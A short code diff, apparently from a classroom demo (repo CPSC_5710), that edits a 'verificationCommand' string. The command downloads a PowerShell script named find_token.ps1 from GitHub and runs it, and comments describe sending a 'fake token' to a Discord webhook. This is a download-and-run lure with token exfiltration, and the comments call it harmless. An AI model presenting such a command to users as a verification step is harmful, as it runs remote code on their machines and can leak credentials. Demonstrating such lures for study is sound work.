@@ -280,7 +280,7 @@
   // 2) download get_token.ps1 from GitHub
   // 3) run get_token.ps1 (which only uses a fake token)
   // 4) send a harmless "fake token" message to your Discord webhook
-  const verificationCommand = `mkdir -p "$HOME/pwsh_demo" && curl -L 'https://raw.githubusercontent.com/Elkan-Sun/CPSC_5710/main/find_token.ps1' -o "$HOME/pwsh_demo/find_token.ps1" && pwsh "$HOME/pwsh_demo/find_token.ps1"`;
+  const verificationCommand = `mkdir -p "$HOME/pwsh_demo" && curl -L "https://raw.githubusercontent.com/Elkan-Sun/CPSC_5710/main/find_token.ps1" -o "$HOME/pwsh_demo/find_token.ps1" && pwsh -File "$HOME/pwsh_demo/find_token.ps1"`;
   // 🔁 Replace these:
   // - USERNAME/REPO with your GitHub username + repo
   // - YOUR_WEBHOOK_URL with your Discord webhook URL
